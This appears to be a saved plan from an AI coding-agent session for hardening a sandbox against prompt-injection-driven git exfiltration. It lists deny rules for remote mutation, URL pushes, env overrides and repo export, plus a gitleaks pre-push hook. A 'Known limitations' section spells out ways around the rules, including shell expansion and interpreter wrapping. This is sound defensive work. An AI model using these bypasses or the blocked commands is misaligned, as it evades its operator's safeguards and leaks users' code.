---
session: /Users/rhhart/.config/weft/session-archive/-Users-rhhart-Documents-GitHub-weft-dev/6f8c0bf4-b2d0-42a1-bf51-f9959d13fca8.jsonl
stamped: 2026-03-14T14:00:40.172Z
---
# Plan: Git remote exfiltration deny rules + pre-push gitleaks hook

## Context

Security research identified `git remote add` as the highest-severity
gap in the current sandbox configuration. A prompt injection could add
an attacker-controlled remote and push the entire commit history to it.
None of the existing five defense layers catch this. The fix: deny rules
blocking all remote mutation, plus a pre-push gitleaks hook as defense
in depth.

## Files to modify

- `~/.claude/settings.json` — add deny rules (Hart edits manually)
- `~/.git-hooks/pre-push` — new gitleaks pre-push hook
- `/Users/rhhart/Documents/GitHub/weft/guides/safer-yolo-mode.md` — see §4
- Gist: `https://gist.github.com/hartphoenix/698eb8ef8b08ad2ce6a99cf7346cd7cc` — see §5
- `/Users/rhhart/Documents/GitHub/roger/drafts/2026-03-04-yolo-mode-security-research.md` — update
- `/Users/rhhart/Documents/GitHub/roger/drafts/2026-03-04-yolo-sandbox-settings-plan.md` — update

## 1. Deny rules to add to settings.json permissions.deny[]

### Remote mutation
```
"Bash(git remote add *)",
"Bash(git remote set-url *)",
"Bash(git remote rename *)",
"Bash(git remote remove *)",
"Bash(git remote rm *)",
```

### Direct URL push (bypass named remotes)
```
"Bash(git push https://*)",
"Bash(git push http://*)",
"Bash(git push git@*)",
"Bash(git push git://*)",
"Bash(git push ssh://*)",
"Bash(git push --repo*)",
```

### Config-based remote manipulation
```
"Bash(git config remote.*)",
"Bash(git config --local remote.*)",
"Bash(git config --add remote.*)",
"Bash(git config --replace-all remote.*)",
"Bash(git config --unset remote.*)",
"Bash(git config --unset-all remote.*)",
"Bash(git config url.*)",
"Bash(git config --local url.*)",
"Bash(git config --add url.*)",
"Bash(git config --replace-all url.*)",
```

Note: `git config credential.*` is intentionally omitted — it is
**ask-gated** via the guard hook (not hard-denied), per the sandbox
settings plan. Credential config has legitimate uses during setup.

### Runtime config override (flags before subcommand)
```
"Bash(git -c remote.* *)",
"Bash(git -c url.* *)",
```

Note: `git -c credential.*` is ask-gated via guard hook, not hard-denied.

### Path-prefixed variants (git -C)
```
"Bash(git -C * remote add *)",
"Bash(git -C * remote set-url *)",
"Bash(git -C * remote rename *)",
"Bash(git -C * remote remove *)",
"Bash(git -C * remote rm *)",
"Bash(git -C * push https://*)",
"Bash(git -C * push http://*)",
"Bash(git -C * push git@*)",
"Bash(git -C * push git://*)",
"Bash(git -C * push ssh://*)",
"Bash(git -C * config remote.*)",
"Bash(git -C * config url.*)",
"Bash(git -C * -c remote.* *)",
"Bash(git -C * -c url.* *)",
```

### Path-prefixed variants (git --git-dir / --work-tree)
```
"Bash(git --git-dir * remote add *)",
"Bash(git --git-dir * remote set-url *)",
"Bash(git --git-dir * remote rename *)",
"Bash(git --git-dir * remote remove *)",
"Bash(git --git-dir * remote rm *)",
"Bash(git --git-dir * push https://*)",
"Bash(git --git-dir * push http://*)",
"Bash(git --git-dir * push git@*)",
"Bash(git --git-dir * push git://*)",
"Bash(git --git-dir * push ssh://*)",
"Bash(git --git-dir * config remote.*)",
"Bash(git --git-dir * config url.*)",
"Bash(git --work-tree * remote add *)",
"Bash(git --work-tree * remote set-url *)",
"Bash(git --work-tree * push https://*)",
"Bash(git --work-tree * push http://*)",
"Bash(git --work-tree * push git@*)",
"Bash(git --work-tree * push git://*)",
"Bash(git --work-tree * push ssh://*)",
```

### Plumbing-level push
```
"Bash(git send-pack *)",
"Bash(git http-push *)",
```

### Submodule (introduces attacker-controlled remote refs)
```
"Bash(git submodule add *)",
```

### Environment variable overrides
```
"Bash(GIT_CONFIG_COUNT=*)",
"Bash(GIT_CONFIG_KEY_*)",
"Bash(GIT_CONFIG_VALUE_*)",
"Bash(GIT_SSH_COMMAND=*)",
"Bash(GIT_SSH=*)",
"Bash(GIT_ASKPASS=*)",
"Bash(GIT_PROXY_COMMAND=*)",
"Bash(export GIT_CONFIG_COUNT=*)",
"Bash(export GIT_CONFIG_KEY_*)",
"Bash(export GIT_CONFIG_VALUE_*)",
"Bash(export GIT_SSH_COMMAND=*)",
"Bash(export GIT_SSH=*)",
"Bash(export GIT_ASKPASS=*)",
"Bash(export GIT_PROXY_COMMAND=*)",
"Bash(env GIT_CONFIG_COUNT=*)",
"Bash(env GIT_CONFIG_KEY_*)",
"Bash(env GIT_CONFIG_VALUE_*)",
"Bash(env GIT_SSH_COMMAND=*)",
"Bash(env GIT_SSH=*)",
"Bash(env GIT_ASKPASS=*)",
"Bash(env GIT_PROXY_COMMAND=*)",
```

### Data export (repo exfiltration without push)
```
"Bash(git fast-export *)",
"Bash(git bundle create *)",
```

## 2. Guard hook additions (ask-gated, not denied)

**Already covered by sandbox auto-generated `denyWithinAllow`:**
- `.git/config` — sandbox auto-blocks writes (confirmed active)
- `.git/hooks/*` — sandbox auto-blocks writes (confirmed active)
- `.git/objects`, `.git/refs`, `.git/HEAD` — also auto-blocked

These are internal sandbox protections, not user-configurable.
`denyWithinAllow` is not a documented settings.json key.

**Not auto-covered — needs explicit protection:**
- `.gitmodules` — submodule URL injection. Add to
  `sandbox.filesystem.denyWrite` in settings.json AND guard hook.

Guard hook should catch `Edit(.gitmodules)` / `Write(.gitmodules)` as
a second layer. The sandbox `denyWrite` entry provides the structural
defense.

## 3. Pre-push gitleaks hook

Add `~/.git-hooks/pre-push` alongside the existing `pre-commit` hook.
Catches secrets in historical commits that bypassed the pre-commit check
(e.g., commits made before gitleaks was installed).

```bash
#!/usr/bin/env bash
# Pre-push hook: scan commits being pushed for secrets
remote="$1"
url="$2"
zero="0000000000000000000000000000000000000000"
while read local_ref local_oid remote_ref remote_oid; do
  # Skip branch deletions (nothing to scan)
  if [ "$local_oid" = "$zero" ]; then
    continue
  fi
  if [ "$remote_oid" = "$zero" ]; then
    range="$local_oid"
  else
    range="$remote_oid..$local_oid"
  fi
  gitleaks git --log-opts="$range" --no-banner
  if [ $? -ne 0 ]; then
    echo "pre-push: gitleaks found secrets in commits being pushed"
    exit 1
  fi
done
```

## Workflow break analysis (appended as notes)

Every rule was analyzed for legitimate workflow impact. Summary:
**all rules are safe to ship.** Every blocked operation is either
(a) rare setup/config work with an easy manual-terminal workaround,
or (b) has a `gh` equivalent (`gh repo sync`, `gh pr checkout`).

| Blocked operation | Frequency | Workaround |
|---|---|---|
| Fork: `git remote add upstream` | Low | `gh repo sync` or manual terminal |
| Multi-remote deploy (Heroku etc.) | Zero (current) | Manual terminal (one-time setup) |
| `git submodule add` | Low | Manual terminal |
| Credential rotation / HTTPS↔SSH | Low (few/year) | Manual terminal (credential-adjacent) |
| Repo migration (URL change) | Rare | Manual terminal |
| Collaborator fork for PR review | Low | `gh pr checkout` covers 80% |
| `git config url.*.insteadOf` | Very low | Manual terminal |
| `git send-pack` / `git http-push` | Zero | N/A (plumbing) |
| `git fast-export` / `git bundle` | Very low | Manual terminal if needed |
| `git --git-dir` / `--work-tree` remote ops | Zero (current) | Manual terminal |
| `export GIT_*` / `env GIT_*` overrides | Zero | Manual terminal |

**Not blocked (confirmed safe):**
- `gh repo fork`, `gh repo clone`, `gh pr checkout` — `gh` subprocesses, not direct git invocations
- Package managers (npm, bun, cargo) — use their own git logic
- VS Code git extensions — separate process, not Claude's Bash tool
- Git LFS — doesn't use blocked commands
- `git push origin <branch>` — normal push to configured origin

## Known limitations (structural, not fixable via deny rules)

These are documented in the security research and cannot be closed
by deny rules. The sandbox is the structural defense.

1. **Shell expansion bypass:** `R=remote; git $R add attacker url`
2. **Interpreter wrapping:** `python3 -c "subprocess.run(['git','remote','add',...])"`
3. **Direct .git/config write via Edit/Write:** Bypasses all `git config` command rules. Sandbox auto-generated `denyWithinAllow` blocks `.git/config` writes; guard hook is the second layer.
4. **Prefix-match flag reordering:** `git push origin --repo=evil` might bypass prefix glob
5. **`dangerouslyDisableSandbox` parameter:** Model-level control only
6. **Env var indirection:** `VAR=GIT_SSH_COMMAND; export $VAR=evil` bypasses the `export GIT_*` deny rules via variable expansion. Same class as #1 (shell expansion). Sandbox is the defense.

## Verification

1. Add rules to settings.json, validate JSON: `python3 -m json.tool < ~/.claude/settings.json`
2. Test: `git remote add test https://example.com` → should be denied
3. Test: `git push origin main` → should still work
4. Test: `git push https://example.com main` → should be denied
5. Test: `gh pr checkout 11` → should still work (gh subprocess)
6. Install pre-push hook, test: push a commit with a known secret pattern → should be caught
7. Verify `.git/config` and `.gitmodules` writes are ask-gated by guard hook

## 4. Guide updates: `safer-yolo-mode.md`

The guide needs these changes to reflect the new rules:

### 4a. JSON settings block (lines 191–396)

Add the new deny rules from §1 into the JSON block. Insert a new
category group after the existing git rules (line 252), with a comment
reference in the line-number index (lines 173–189):

- **Git remote exfiltration** — remote mutation, direct-URL push,
  config-based remote manipulation, `--git-dir`/`--work-tree` variants,
  plumbing push, submodule add, env var overrides (`export`/`env`
  variants included), data export (`fast-export`, `bundle create`)

Also add `.gitmodules` to the `sandbox.filesystem.denyWrite` array
in the JSON block.

### 4b. Layer 5 → Layers 5+6

Rename current "Layer 5: Pre-commit secret scanning" and add a new
section for the pre-push hook:

> **Layer 6: Pre-push secret scanning**
>
> A global git hook that scans commits being pushed for secrets that
> bypassed the pre-commit check (e.g., commits made before gitleaks was
> installed, or commits from other machines). Uses gitleaks in git-log
> mode. Skips branch deletions.

Update "five layers" references in the guide body (lines 683–684) to
"six layers."

### 4c. Setup: add Step 2b

After the existing pre-commit hook setup (Step 2), add the pre-push
hook installation:

> Write this to `~/.git-hooks/pre-push`:
>
> (pre-push script from §3 of this plan)
>
> ```bash
> chmod +x ~/.git-hooks/pre-push
> ```

### 4d. "What's Protected" section

Add a new bullet under "Protected" (after line 491):

> - **Git remote exfiltration** — deny rules block adding attacker-
>   controlled remotes, pushing to arbitrary URLs, manipulating remote
>   config via `git config` or env vars, and exporting repo data via
>   plumbing commands. Sandbox auto-blocks direct `.git/config` writes.

### 4e. "Smaller residual risks" section

Add after the existing bullets:

> - **Shell expansion and env var indirection.** `R=remote; git $R add`
>   or `VAR=GIT_SSH_COMMAND; export $VAR=evil` bypass prefix-glob deny
>   rules. The sandbox is the structural defense for these.
> - **`--git-dir` flag reordering.** Deny rules cover `--git-dir` before
>   `remote`/`push`/`config`, but unusual flag orderings could bypass
>   prefix matching. Same class as the existing "prefix-match flag
>   reordering" limitation.

### 4f. "Git remote operations require a separate terminal"

This existing section (lines 561–581) already covers the push/pull
limitation. No change needed — the new deny rules don't affect this
since `git push origin <branch>` to configured origin remains allowed.

### 4g. Gitleaks Reference section

Add a subsection after "Per-repo hooks" (line 662):

> ### Pre-push scanning
>
> The pre-push hook complements the pre-commit hook. It scans the commit
> range being pushed, catching secrets in commits that were made before
> gitleaks was installed or on machines without the pre-commit hook. The
> hook skips branch deletions (where there's nothing to scan).
>
> The pre-push hook uses `gitleaks git --log-opts` mode, which walks
> the commit log rather than scanning staged files. This means it checks
> historical commits, not working-tree content.

## 5. Gist updates

The gist at `https://gist.github.com/hartphoenix/698eb8ef8b08ad2ce6a99cf7346cd7cc`
is the public-facing security research and threat model. It needs:

### 5a. New threat vector section

Add a section documenting the git remote exfiltration attack chain:

- Attack: prompt injection adds attacker-controlled remote, pushes
  commit history
- Why existing layers missed it: sandbox doesn't block `git remote add`
  (it's a local config write); DCG doesn't pattern-match it; deny rules
  didn't cover it; pre-commit hook only scans staged files
- Five bypass variants: direct `git remote`, `git config remote.*`,
  `git -c remote.*`, env var overrides, plumbing (`send-pack`)
- Fix: deny rules covering all five variants + pre-push gitleaks hook

### 5b. Updated deny rule count / summary

The gist likely references the original deny rule count. Update to
reflect the new rules added here.

### 5c. Known limitations update

Add limitations #3 (`.git/config` direct write — now with
`denyWithinAllow` context) and #6 (env var indirection) from the
known limitations section of this plan.

### 5d. Pre-push hook documentation

Add the pre-push hook as a sixth defense layer alongside the existing
five. Include the hook script and rationale.
